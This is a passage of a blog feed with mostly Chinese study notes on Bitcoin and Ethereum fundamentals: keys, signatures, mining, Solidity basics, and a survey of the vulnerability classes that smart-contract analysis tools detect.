        <content type="html"><![CDATA[<h1 id="区块链入门">区块链入门</h1><h2 id="历史与展望">历史与展望</h2><h3 id="历史">历史</h3><p>密码朋克（Cyberpunk）一个崇尚数学、密码学、计算机技术等的小组。</p><p>简介： <ahref="https://zhuanlan.zhihu.com/p/47079845">密码朋克是什么？</a> <ahref="https://www.huxiu.com/article/269132.html">密码朋克消亡史</a></p><p>比特币的诞生离不开前人众多技术支持，如: POW,时间戳方法保证数字文件安全的协议、点对点交易、加密货币等。同样，区块链不是一个单一的技术，而是一些技术的集合。</p><h3 id="前景">前景</h3><p>应用场景：</p><ol type="1"><li>资产：数字资产发行、支付（跨境支付）、交易、结算</li><li>记账：股权交易、供应链金融、商业积分、</li><li>不可篡改：溯源、众筹、医疗证明、存在性证明</li><li>点对点：共享经济、物联网</li><li>隐私：匿名交易，</li></ol><h2 id="比特币简介">比特币简介</h2><ol type="1"><li>比特币是数字货币优点：财产只受自己控制、安全、无通胀、没有假钞、流通性好、匿名缺点：</li><li>去中心化记账系统</li></ol><h2 id="分类">分类</h2><p>区块链分为区块链公链、私链、联盟链、侧链，特点有哪些, 参考: <ahref="https://zhuanlan.zhihu.com/p/36309354">什么是区块链公链、私链、联盟链、侧链。</a><ahref="http://sudobash.cn/post/blockchain/2018/03/blockchain/kinds-of-blockchain.html">区块链，私链，公链，联盟链之我见</a><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20203271585321442991.png"alt="区块链(公链)发展史" /></p><p>区块链 1.0, 2.0 的 TPS出块速度慢，而且不知道要等多久。因此出现了区块链 3.0的想法，想要高性能，大吞吐量。 区块链 3.0， 当前的 EOS性能提高了，但是是以牺牲了部分去中心化的特点来实现的。它有 21个超级节点。</p><h2 id="比特币原理">比特币原理</h2><h3 id="账本验证">账本验证</h3><p>通过将整个账本进行 hash，然后对比分布式不同机器中的 hash值是否一致，采用少数服从多数原则。 <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200503151249.png"alt="Ledger hash" /></p><p>一个区块: 序号、时间戳、账本的 hash 值、交易记录 <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200503151531.png"alt="block" /></p><p>新账本的产生：</p><p>比特币每 10 分钟记账一次，通过将旧账本的 hash 值和新添加交易记录一起hash，形成新的账本的 hash。 <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200503151839.png"alt="new ledger" /></p><p>每个节点在核对的时候，只需要核对最后一个区块的摘要信息，如果它正确，那说明前面的也正确。</p><h3 id="账户所有权问题">账户所有权问题</h3><p>账户用地址保存，转账的过程是将比特币从一个地址转移到另一个地址。账本上是不保存任何个人信息的。</p><p>一条转账记录</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;付款地址&quot;</span><span class="punctuation">:</span> <span class="string">&quot;一串付款数字地址用来付款&quot;</span>，</span><br><span class="line">    <span class="attr">&quot;收款地址&quot;</span><span class="punctuation">:</span> <span class="string">&quot;一串数字地址用来收款&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;金额&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2btc&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="私钥">私钥</h4><p>比特币中一个地址对应有一个私钥,拥有私钥才可以登录该账户地址，进行转账付款等。一但私钥泄露，比特币就有可能会丢失。</p><p>公钥、私钥、地址的关系:</p><ol type="1"><li>私钥：实际上是一组随机数，关于区块链中的随机数我们已经介绍过了</li><li>公钥：对私钥进行椭圆曲线加密算法生成，但是无法通过公钥倒推得到私钥。公钥的作用是在和对方交易时，使用自己的私钥加密信息，然后对方使用自己的公钥解密获得原始信息，这个过程俗称签名。</li><li>地址：由于公钥太长，在交易中不方便使用，就对公钥哈希进行SHA256、RIPEMD160、Base58 算法加密生成地址</li></ol><p>总结，私钥-&gt;公钥-&gt;地址</p><h4 id="签名与验证">签名与验证</h4><p>采用非对称加密技术，通过签名验证来证明账户所有权（也就是在不泄露私钥的情况下，证明拥有私钥）</p><ol type="1"><li><p>签名（加密）</p><ol type="1"><li><p>对交易进行 hash 得到摘要 <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/2020531588500902676.png"alt="transaction hash" /></p></li><li><p>用交易的 hash 摘要和私钥进行签名 <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/2020531588500983010.png"alt="sign" /></p></li></ol></li><li><p>广播交易向周围节点广播交易和签名，周围节点收到后再次向外广播</p></li><li><p>验证（解密） 签名验证的目的有两个：</p><ol type="1"><li>证明交易所引用的 UTXO 的确属于付款人。 具体到本次交易，就是证明交易001 的序号为 0 的 UTXO 的确是发给 B 的。 方法：- [ ] 暂时不写</li><li>证明交易的所有数据的确是付款人提供的，且未被修改过。具体到本次交易，就是证明 B 的确创建了交易002，且交易内的数据未被修改过。方法:使用签名和付款方地址进行验证操作，如果结果为交易的摘要，验证通过<imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/2020531588502263289.png"alt="verity" /></li></ol></li></ol><h2 id="记账挖矿">记账(挖矿)</h2><p>记账: Hash打包的过程，该过程又被称为挖矿，通过消耗算力打包区块，获取一定的奖励</p><h3 id="规则">规则</h3><ol type="1"><li>一段时间内只有一人可以记账成功</li><li>通过解决密码学难题（即工作量证明）竞争获得唯一记账权</li><li>其他节点复制记账结果</li></ol><h3 id="工作量证明">工作量证明</h3><p>如果按照需要打包的话，只需要计算 Hash（上一个 Hash 值，交易记录集）的hash值即可。但是为了出块时间的稳定，就必须提高计算的难度，因此比特币采取加入随机值，要求结果hash 值以 n 个 0 开头<code>Hash（上一个Hash值，交易记录集，随机数）= 00eeaFD635BCD</code>,因此，挖矿的过程就是不断遍历随机数，寻找符合前 n 个数为 0 的结果 hash值的过程</p><h4 id="交易记录集">交易记录集</h4><ol type="1"><li>收集广播中还没有被记录账本的交易</li><li>交易的有效性验证（两个方面）</li><li>添加一笔给自己转账的交易（挖矿奖励）</li></ol><h3 id="共识机制">共识机制</h3><p>两个节点同时完成工作量证明，使用谁的区块？</p><p>为什么要遵守协议？ 节点工作量只有在其他的节点认同其是有效的</p><p>POW 累计工作量最大的区块链</p><p>比特币采用的共识算法就是 POW，矿工们在挖一个新的区块时，必须对SHA-256 密码散列函数进行运算，区块中的随机散列值以一个或多个 0开始。随着 0数目的上升，找到这个解所需要的工作量将呈指数增长，矿工通过反复尝试找到这个解。</p><p>每个节点根据总是独立地去选择最长的（工作量最大的那条链)</p><p>参考资料: <ahref="https://zhuanlan.zhihu.com/p/31882881">比特币钱包的理解（一）私钥、密码、助记词</a><ahref="http://www.jouypub.com/2018/7fa3a59868f7c62ec77a02a887c1bae0/">区块链之公钥、私钥、地址之间的关系</a></p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Blockchain Transactions</title>
      <link href="/blog/2021/03/30/blockchain/2.Transactions/"/>
      <url>/blog/2021/03/30/blockchain/2.Transactions/</url>
      
        <content type="html"><![CDATA[<h1 id="transactions">Transactions</h1><p>How ethereum transaction work and how the ethereum blockchain makesure the transaction is authentic.</p><p><code>sendTransaction</code> 函数一般有以下几个参数：</p><ol type="1"><li><code>from: [account]</code></li><li><code>to: [account](optional)</code></li><li><code>value:[integer] in wei</code></li><li>gas:maximum amount of gas used</li><li>gasPrice:amount of wei per gas</li><li>data: ABI Byte string(optional)</li><li>nonce: Integer of a nonce，in order to avoid replay attacks</li></ol><p>例如：<ahref="https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#sendtransaction">sendTransactionof web3.js</a></p><h2 id="signature">Signature</h2><ul><li>Transaction Signatures ensure authenticity of transactions</li><li>Signatures are generated from Private Keys</li></ul><p><ahref="https://web3js.readthedocs.io/en/v1.2.11/web3-eth-accounts.html#signtransaction">signTransactionof web3.js</a></p><p>三个参数：v,r,s 为签名. With these three parameter, we canauthenticate the transaction isn't from malicious actor</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16171092613915.jpg"alt="16171092613915" /><figcaption aria-hidden="true">16171092613915</figcaption></figure><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16450841359407.jpg"alt="16450841359407" /><figcaption aria-hidden="true">16450841359407</figcaption></figure><p>步骤：</p><ol type="1"><li>首先，我们通过 MetaMask 创建交易，from A to B，value=c</li><li>MetaMask 存储发送方账户的私钥（私钥，32 bytes=64 hexcharacters）</li><li>通过 ECDSA 算法（Elliptic Curve Digital SignatureAlgorithm），得出公钥</li><li>通过取经过 Keccak 算法处理的公钥的后 20 字节，作为账户地址</li><li>通过私钥对交易进行签名，产生 v，r，s 三个重要参数</li><li>通过 v，r，s 利用 ECRECOVER 验证签名（通过 ecrecover函数与签名可以得出签名者的公钥，进而得出签名者的地址，最终对比是否与声称的签名地址一致）</li></ol><p>Public Keys and Addresses are generated from Private Keys. PrivateKeys have to be kept save under all circumstances</p><p><a href="https://zhuanlan.zhihu.com/p/121039362">UTXO讲解-比特币交易底层技术详解 - 知乎</a></p><p><ahref="https://btc.com/btc/transaction/4a5e1e4baab89f3a32518a88c31bc87f618f76673e2cc77ab2127b7afdeda33b">中本聪创世铸币交易-BitcoinCoinBase Tx</a></p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>以太坊智能合约漏洞检测工具漏洞覆盖总结</title>
      <link href="/blog/2021/03/30/blockchain/eth_vulns/eth_detection_tools/"/>
      <url>/blog/2021/03/30/blockchain/eth_vulns/eth_detection_tools/</url>
      
        <content type="html"><![CDATA[<p>漏洞分类采用 <ahref="https://github.com/eth-sri/securify2">securify2</a> 总结的。</p><h2 id="teether">TEETHER</h2><p>由于它的攻击者模型是: 偷以太币，所以将有关转账必用的指令:凡是合约中包含指令集 CALL、SELFDESTRUCT、CALLCODE、DELEGATECALL都被认为是脆弱的合约</p><p><ahref="https://clouddatalab.github.io/paper/2018/12/29/TEETHER-Gnawing-at-Ethereum-to-Automatically-Exploit-Smart-Contracts/">TEETHER:Gnawing at Ethereum to Automatically Exploit Smart Contracts</a></p><h2 id="smartcheck">SmartCheck</h2><ol type="1"><li><p><strong>Security</strong> issues lead to exploits by a malicioususer account or contract</p><p>Balance equality(2.1.1) Unchecked external call(2. 1.2) DoS byexternal contract(2.1.3 send instead of transfer(2.1.4)Reentrancy(2.1.5) Malicious libraries(2.1.6) USing tx origin(2.1.7)Transfer for wards gas(21.8)</p></li><li><p><strong>Functional</strong> issues cause the violation of theintended func tonality</p><p>Integer divIsion(2.2.1) Locked money(2.2.2) Unchecked math(2.2.3)---溢出 Timestamp dependence(2.2. 4) Unsafe type inference(2.2.5)--编码规范</p></li><li><p><strong>Operational</strong> issues lead to run-time problems, e.g, bad per formance</p><p>Byte array Costly loop -- dos loop gas limit</p></li><li><p><strong>Developmental</strong> issues make code difficult tounderstand Improve</p><p>Token api violation Compiler version not fixed private modIfierRedundant fallback function Style guide violation Implicit visibilitylevel</p></li></ol><p>We differentiate between functional and security issues: the formerpose problems even without an adversary（though an external maliciousactor can aggravate the situation), while the latter do not.</p><p>论文 第五页 table 1</p><h2 id="sfuzz">sFUZZ</h2><p>检测的漏洞:</p><p>Gasless send Exception Disorder Reentrancy Timestamp Dependency BlockNumber Dependency Dangerous Delegate call Integer Overflow IntegerUnderflow Freezing ether</p><h2 id="ethploit">ETHPLOIT</h2><p>p2 页</p><p>Vulnerabilities of smart contract platforms could happen at theblockchain level, EVM level, and contract level We focus thecontract-level vulnerabilities.</p><ol type="1"><li>Balance Increment（合约可以向任意账户发送 ether）</li><li>Self-destruction.</li><li>Code Injection(从外部合约引入恶意代码)</li></ol><ol type="1"><li>Unchecked Transfer Value</li><li>Vulnerable Access Control</li><li>Exposed Secret(论文新提出的)</li></ol><h2 id="gasfuzz">GasFuzz</h2><p>DoS With Block Gas Limit/ Out-of-Gas Vulnerability</p><h2 id="gasper">GASPER</h2><p>GAS-costly Patterns checker</p><p>3 representative patterns in 2 categories</p><p>Two categories: useless-code related patterns and loop-relatedpatterns. 一、Category 1: Useless-code related Patterns</p><ol type="1"><li>Dead code</li><li>Opaque predicate</li></ol><p>二、Category 2: Loop-related Patterns</p><ol type="1"><li>Expensive operations in a loop</li><li>Constant outcome of a loop</li><li>Loop fusion</li><li>Repeated computations in a loop</li><li>Comparison with unilateral outcome in a loop</li></ol><h2 id="madmax">MadMax</h2><p>gas-focused vulnerabilities:</p><ol type="1"><li><p>Unbounded Mass Operations（in loops）</p><p>由用户输入决定行为的循环，可能会迭代过多次，消耗 gas</p></li><li><p>Non-Isolated External Calls (Wallet Griefing)</p><p>invoking external functionality: implicit code invocation at an Ethertransfer, handling multiple clients without isolation, and standardpractices for aborting on a send failure.</p></li><li><p>Integer Overflows</p><p>特定情况下的整形溢出，例如: 循环，边界溢出导致无终止，gas消耗</p></li></ol><p>1 和 2 是 DoS With Block Gas Limit/ Out-of-Gas Vulnerability 的 2种具体分类</p><h2 id="vandal">Vandal</h2><ol type="1"><li><p>Unchecked Send</p></li><li><p>Reentrancy</p></li><li><p>Unsecured Balance / Incorrect Constructor Name</p><p>Solidity version 0.4.22 以上，如果正确编码，可以杜绝。</p></li><li><p>Destroyable contracts</p><p>selfdestruct 函数，认证不足，可被任意调用</p></li><li><p>Origin vulnerabilities</p><p>使用 tx.origin 认证</p></li></ol><h1 id="ethainter">Ethainter</h1><ol type="1"><li>accessible selfdestruct</li><li>tainted selfdestruct</li><li>tainted owner variable</li><li>unchecked tainted staticcall</li><li>tainted delegatecall</li></ol><h2 id="目前看到的几种分类">目前看到的几种分类</h2><ol start="2" type="1"><li>SmartCheck 的分类</li><li><ahref="https://www.chainnode.com/post/397677">最全整理|智能合约审计工具检测内容有哪些？</a></li><li><ahref="https://consensys.github.io/smart-contract-best-practices/known_attacks/#reentrancy">consensysKnown Attacks</a></li><li><a href="https://mythx.io/detectors/">MythX detectors</a></li><li><a href="https://github.com/smartdec/classification">Classificationof smart contract vulnerabilities</a></li><li><ahref="https://github.com/sigp/solidity-security-blog">solidity-security-blog</a></li><li><a href="https://arxiv.org/pdf/1908.04507.pdf">A Survey on EthereumSystems Security: Vulnerabilities, Attacks and Defenses</a></li></ol><p><a href="https://tool.smartdec.net/knowledge">smartcheck漏洞列表</a></p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>以太坊入门</title>
      <link href="/blog/2021/03/30/blockchain/ethereum/1.ethereum/"/>
      <url>/blog/2021/03/30/blockchain/ethereum/1.ethereum/</url>
      
        <content type="html"><![CDATA[<h1 id="ethereum">Ethereum</h1><h2 id="introduction">introduction</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/web3js_eth.png"alt="web3js_eth" /><figcaption aria-hidden="true">web3js_eth</figcaption></figure><p>There are a JavaScript library for developers which is web3.js，assome kind of portal or window of Ethereum network，can be usedd to sendmoney，store data，deploy contracts or do essential what ever we want todo on the network</p><p>There are two options for consumers, which are Metamask(a broswerextension)、Mist Broswer(early beta)</p><h2 id="smart-contract">Smart Contract</h2><p>以太坊的核心是智能合约，智能合约就是一段可以通过人或者另一个合约发送消息来执行特定的操作的代码。</p><p>什么是智能合约 以太坊上的程序，是代码和数据（状态）的集合。准图灵完备</p><p>典型应用：代币：EOS，游戏：迷恋猫</p><p>编程语言：Solidity Solidity 是一种用于编写智能合约的高级语言，运行在Ethereum 虚拟机（以太坊虚拟机，EVM）之上 Solidity 语言的语法接近于JavaScript，是一种面向对象的语言静态语言， <code>.sol</code> 后缀。</p><p>Solidity 是一种图灵完备的编程语言，所以编程的方式与Java、C++类似。不过 Solidity语言中并没有类的概念，但有一个合约的概念，用关键字 contract 表示。</p><h2 id="account">Account</h2><p>地址(Address)：20 字节 状态(State)</p><p>账户分类：</p><p>外部账户(EOA) Externally owned account 合约账户:当合约的字节码被部署到区块链时，便会有一个特定的地址来标识合约，这个地址便成为合约账户。</p><p>从 EVM 角度来说，这两个账户是一样的，但是他们还是有一些区别。</p><h3 id="账户组成">账户组成</h3><p>三个部分都是以 16 进制存储</p><p>当我们在 Metamask 上面创建一个账户时，有三个主要组成部分:三个部分都是以 16 进制存储</p><ol type="1"><li>Account Address Account Address is a unique identifier，like a emailaddress or unique username.一个账户适用于所有的以太坊网络，但是一个账户在不同网络中的以太币数量与该网络绑定的，即:某个网络认为该地址有一定 ether， 另一个网络却认为它没有。</li><li>Public Key</li><li>Private Key</li></ol><p>私钥、公钥和地址是如何生成的？ 大体来说，地址的生成的流程是：私钥-&gt; 公钥 -&gt; 地址。因此地址的生成需要三步：</p><p>生成一个随机的私钥（32 字节） 通过私钥生成公钥（64 字节）通过公钥得到地址（20 字节）</p><p>私钥推导公钥 私钥是一组 64 位的 16进制字符，通过私钥我们能够访问一个账户。以太坊的私钥生成是通过 secp256k1椭圆曲线算法生成的，secp256k1 是一个椭圆曲线算法，同比特币。</p><p>公钥推导地址和比特币相比，在私钥生成公钥这一步其实是一样的，区别在公钥推导地址第一部分，以太坊中非圧缩型公钥的处理就简单粗暴很多了，下图为Public Key 生成 Address 的过程。</p><p>以太坊地址生成的过程 第一步：私钥 (private key)</p><p>伪随机数产生的 256bit 私钥示例(256bit 16 进制 32 字节)</p><p>18e14a7b6a307f426a94f8114701e7c8e774e7f9a47e2c2035db29a206321725</p><p>第二步：公钥 (public key)</p><ol type="1"><li>采用椭圆曲线数字签名算法 ECDSA-secp256k1 将私钥（32字节）映射成公钥（65 字节）（前缀 04+X 公钥+Y 公钥）：</li></ol><p>04 　　50863ad64a87ae8a2fe83c1af1a8403cb53f53e486d8511dad8a04887e5b2352 　　2cd470243453a299fa9e77237716103abc11a1df38855ed6f2ee187e9c582ba6</p><pre><code>   2. 拿公钥（非压缩公钥）来hash，计算公钥的 Keccak-256 哈希值（32bytes）：</code></pre><p>fc12ad814631ba689f7abe671016f75c54c607f082ae6b0881fac0abeda21781</p><pre><code>   3. 取上一步结果取后20bytes即以太坊地址：</code></pre><p>1016f75c54c607f082ae6b0881fac0abeda21781</p><p>第三步：地址 (address)</p><p>0x1016f75c54c607f082ae6b0881fac0abeda21781</p><h3 id="账户关系">账户关系</h3><p>消息只能由外部账户(EOA)发起。未激活状态下，合约账户不能主动创建交易，只能被动触发。</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/2020561588727456628.png"alt="account relationship" /><figcaption aria-hidden="true">account relationship</figcaption></figure><h2 id="wallet">wallet</h2><p>Geth(Go)、Mist、MetaMask</p><h2 id="transaction">Transaction</h2><p>作为后续做项目的准备，首先我们可以索取一些测试 Ether到自己的钱包中，一些可以获得测试 Ether 的网址如下:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://faucet.ropsten.be/</span><br><span class="line">https://faucet.rinkeby.io/</span><br><span class="line">https://www.rinkeby.io/#faucet</span><br></pre></td></tr></table></figure><h3 id="获得-ether-的原理">获得 Ether 的原理</h3><ol type="1"><li><p>大致过程 我们提交自己的地址，最终便会发生一笔向我们转入 Ether交易， 其过程/原理如下: <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/eth_transaction.png"alt="eth_transaction" /></p></li><li><p>一个 Transaction object 的结构： <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/eth_transaction_header.png"alt="eth_transaction_header" /></p></li></ol><p>v，r，s 由发送者私钥生成，进行数字签名。达到授权和认证的目的。</p><ol type="1"><li>Transaction object 与以太网络 We send the transaction to onespecific node in The Ethereum Network。That node will communicating therest of nodes in the network。 The node have one entire copy ofblockchain. 由于节点众多，有时候一个节点可能会同时接受多个交易。节点将同时收到的交易，打包成一个交易列表，也就是我们所称的“区块”，然后节点运行 validation logic，也就是挖矿(mining)</li></ol><h3 id="挖矿">挖矿</h3><p>Anders discussion of blockchains and how they work is viewed as a'must watch' video</p><h2 id="gas">Gas</h2><p>交易手续费 Gas 费用：Gas 价格（用以太币计价）*Gas 数量</p><p>合约越复杂(计算、内存占用等)，需要的 Gas越多。任何一个特定的合约需要的 Gas 数量永远都是固定的。</p><p>愿意为这笔交易所付出的费用限制一个合约运行的工作量，避免阻塞整个网络。</p><p>以太坊的单位：</p><p>最小单位：1Wei（伟） 109 Wei=1 Gwei 1012 Wei=1 szabo（萨博） 1015Wei=1finey（芬尼） 10^18 Wei=1 Ether</p><h2 id="以太坊网络">以太坊网络</h2><p>主网、测试网络、私有链、模拟环境</p><h2 id="去中心化应用-dapp">去中心化应用 Dapp</h2><p>传统互联网应用 中心化，容易更新，数据完全掌控 去中心化应用去中心化，按规则运行</p><p>去中心化应用架构 <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/2020561588742276228.png"alt="Dapp structure" /></p><p>参考推荐: <ahref="http://blog.luoyuanhang.com/2018/04/17/eth-basis-accounts-address-pubkey-prikey/">【Ethereum基础】：账户、地址、私钥和公钥</a> <ahref="https://stevenocean.github.io/2018/04/02/about-ethereum-keystore.html">以太坊账户管理之keystore 文件(科普)</a></p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Smart Contract and Solidity</title>
      <link href="/blog/2021/03/30/blockchain/ethereum/2.solidity_intro/"/>
      <url>/blog/2021/03/30/blockchain/ethereum/2.solidity_intro/</url>
      
        <content type="html"><![CDATA[<h1 id="solidity-环境配置与简介">Solidity 环境配置与简介</h1><ol type="1"><li>配置 remix-ide 和remixd,共享本地文件，防止清除浏览器缓存丢失合约文件</li><li><a href="https://github.com/ethereum/remix-project/issues/833">解决remixed bug 只指向目录</a></li><li>Configure "Deploy &amp; Run Transactions" Plugin, so it uses ourMetaMask Wallet to access the Blockchain.</li></ol><h2 id="smart-contract">Smart Contract</h2><ul><li>A piece of code running on the blockchain.</li><li>It's a state machine.</li><li>Needs transactions to change state（Statechange happens throughmining+transactions.）</li><li>Can do logic operations</li><li>It's turing complete That means <em>in theory</em> it can solve anycomputation problem</li></ul><h2 id="smart-contract-programming-language">Smart Contract ProgrammingLanguage</h2><p>Such as Solidity、Vyper、LLL etc， they are all getting complied.What you actually send to the blockchain is EVM Bytecode.</p><p>Smart Contracts are running on the blockchain，Deployed as EVMBytecode They are turing complete</p><h2 id="solidity">Solidity</h2><ul><li>The most popular smart contract programming language</li><li>Every high-level language code compiles to Bytecode.</li><li>Every Ethereum node in the network executes the same code Becauseevery node has a copy of chain.</li><li>Second popular language is Vyper which is research-oriented, derivedfrom Python.</li></ul><h2 id="introduction">Introduction</h2><p>文件结构 数据类型 错误处理(通过回退) 参数 控制结构 可见性 函数</p><h2 id="合约文件结构">合约文件结构</h2><ol type="1"><li>版本声明</li><li>import</li><li>合约<ol type="1"><li>状态变量</li><li>函数</li><li>结构类型</li><li>时间</li><li>函数修改器</li></ol></li><li>代码注释</li></ol><h2 id="版本声明">版本声明</h2><p>First line: Version Pragma, Pre-Compiler Statement Lock in theSolidity Compiler Version</p><p><code>pragma solidity ^0.4.24</code> 指大于 0.4.24 版本的 solidity编译器才可以运行该文件 solidity版本更迭比较快，因此不提供向后兼容（BackwardCompatibility）：指新的版本的软／硬件可以使用老版本的软／硬件产生的数据。</p><h2 id="type">Type</h2><p>DataTypes：(U)int, Boolean, Array，Struct, Mapping. Address，<strong>No Floats!</strong></p><h3 id="值类型">值类型</h3><p><ahref="https://solidity.readthedocs.io/en/v0.6.7/types.html">solidity0.6.7 types</a></p><p><strong>布尔类型</strong>（Booleans）<strong>整型</strong>（Integers） 定长浮点型（Fixed Point Numbers）定长字节数组（Fixed-size byte arrays） 有理数和整型常量（Rational andInteger Literals） <strong>字符串常量</strong>（String literals）十六进制常量（Hexadecimal literals） 枚举（Enums） 函数类型（FunctionTypes） <strong>地址类型</strong>（Address） 地址常量（AddressLiterals）</p><h4 id="bool">bool</h4><p>取值：<code>true/false</code> 运算符 (三种逻辑运算以及等于、不等于)<code>!</code>、<code>&amp;&amp;</code>、<code>||</code>、<code>==</code>、<code>!=</code></p><h4 id="intuint">int/uint</h4><p>int 和 uint 都支持后面加数字，关键字 uint8 到 uint256(以 8 步进)运算符: 比较运算: <code>&lt;=, &lt;, ==, !=, &gt;=, &gt;</code> 位运算:<code>&amp;, |, ^(异或),~（位取反）</code> 算术运算:<code>+,-,一元运算符-, 一元运算+，*，/,%(取余数)，**(幂)，&lt;&lt;（左移位），&gt;&gt;（右移位）</code></p><h4 id="literals">literals</h4><p>四类常量</p><ol type="1"><li>有理数和整型常量（Rational and Integer literals）常量运算不会有溢出</li><li>字符串常量(String literals)<ol type="1"><li>可以隐式地转换为自己数组或者字符串数组</li><li>字符串常量和 C，C++不一样，没有结尾的 ''，即：有几个字符就是几个字节</li></ol></li><li>十六进制常量(Hexadecimal literals) <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">restHexLiterals</span>(<span class="params"></span>) public constant <span class="keyword">return</span>(byte2, byte1, byte1)&#123;</span><br><span class="line">    byte2 a = hex<span class="string">&quot;abcd&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (a,a[<span class="number">0</span>], a[<span class="number">1</span>])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><code>byte&#123;n&#125;</code> 表示 n 个字节的数组</li><li>地址常量(Address Literals)</li></ol><h4 id="地址类型">地址类型</h4><p>address：表示一个账户地址（20 字节）<code>0x72ba7d8e73fe8eb666ea66babc8116a41bfb10e2</code> 成员属性：balance 函数：transfer()</p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>区块链的原理</title>
      <link href="/blog/2021/03/15/blockchain/1.principle/"/>
      <url>/blog/2021/03/15/blockchain/1.principle/</url>
      
        <content type="html"><![CDATA[<h1 id="区块链的原理">区块链的原理</h1><p><a href="https://coindemo.io/">Coin Demo - Cryptocurrency Demo</a> <ahref="https://andersbrownworth.com/blockchain/">Blockchain Demo</a> <ahref="https://blockchaindemo.io/">blockchaindemo</a></p><p>区块链是由一系列区块组成，每个区块包括如下几部分信息:</p><p>A blockchain has a list of blocks.</p><p>It starts with a single block, called the genesis block. Each blockstores the following information:<code>Index、Timestamp、Hash、Previous hash、Data、Nonce</code></p><h2 id="组成">组成</h2><h3 id="index"><code>Index</code></h3><p>The index is the position of the block in the chain. The genesisblock has an index of 0. The next block will have an index of 1.</p><h3 id="timestamp"><code>Timestamp</code></h3><p>A record of when the block was created. The timestamp helps to keepthe blockchain in order.</p><h3 id="hash"><code>Hash</code></h3><p>A hash looks like a bunch of random numbers and letters. It is aalphanumeric value that uniquely identifies data, or the "digitalfingerprint" of data.</p><h4 id="properties-of-a-hash">Properties of a hash</h4><ol type="1"><li>Hash has a fixed length.</li><li>Same data always maps to same hash.</li><li>Different data always maps to a different hash (within practicallimitations).</li><li>Is easy to compute.</li><li>Is infeasible to convert hash to data.</li><li>A small change in data leads to a large change in hash.</li></ol><h4 id="valid-hash">Valid Hash</h4><p>A valid hash for a blockchain is a hash that meets a certainrequirement. For this blockchain, having three zeros at the beginning ofthe hash is the requirement for a valid hash. The number of leadingzeros required is the difficulty.</p><h4 id="block-hash-calculation">Block Hash Calculation</h4><p>A hashing function takes data as input, and returns a uniquehash.</p><p>f ( data ) = hash</p><p>Since the hash is a "digital fingerprint" of the entire block, thedata is the combination of index, timestamp, previous hash, block data,and nonce.</p><p><code>f ( index + previous hash + timestamp + data + nonce ) = hash</code></p><p>Replace the values for our genesis block, we get:</p><p><code>f ( 0 + "0" + 1508270000000 + "Welcome to Blockchain Demo 2.0!" + 604 ) = 000dc75a315c77a1f9c98fb6247d03dd18ac52632d7dc6a9920261d8109b37cf</code></p><h4 id="previous-hash">Previous hash</h4><p>The previous hash is the hash of the previous block.</p><p>The genesis block's previous hash is "0" because there is no previousblock.</p><h2 id="data">Data</h2><p>Each block can store data against it. In cryptocurrencies such asBitcoin, the data would include money transactions.</p><h2 id="nonce">nonce</h2><p>The nonce is the number used to find a valid hash.</p><p>To find a valid hash, we need to find a nonce value that will producea valid hash when used with the rest of the information from thatblock.</p><h2 id="mining-a-block">Mining a block</h2><p>The process of determining this nonce is called mining.</p><p>We start with a nonce of 0 and keep incrementing it by 1 until wefind a valid hash.</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/nonce.a6291d01.gif"alt="mining a block" /><figcaption aria-hidden="true">mining a block</figcaption></figure><p>As difficulty increases, the number of possible valid hashesdecreases. With fewer possible valid hashes, it takes more processingpower to find a valid hash.</p><p>If the hash on the block is invalid, click on the tool button to minethe genesis block!</p><h2 id="data-mutation">Data mutation</h2><p>Edit the "Welcome to Blockchain Demo 2.0!" input!</p><p>Since data is an input variable for the hash, changing the data willchange the hash.</p><p>The new hash will not have three leading zeros, and therefore becomesinvalid.</p><h2 id="mutation-effect">MUTATION EFFECT</h2><p>Subsequent blocks will also be invalid.</p><p>A hash change will cause a mutation in the previous hash ofsubsequent blocks. Since previous hash is used to calculate the hash,subsequent hashes will also change.</p><p>This will lead to a cascading invalidation of blocks.</p><p>Try it yourself:</p><p>Add 3 blocks, then mutate the genesis block input.</p><h2 id="adding-a-new-block">ADDING A NEW 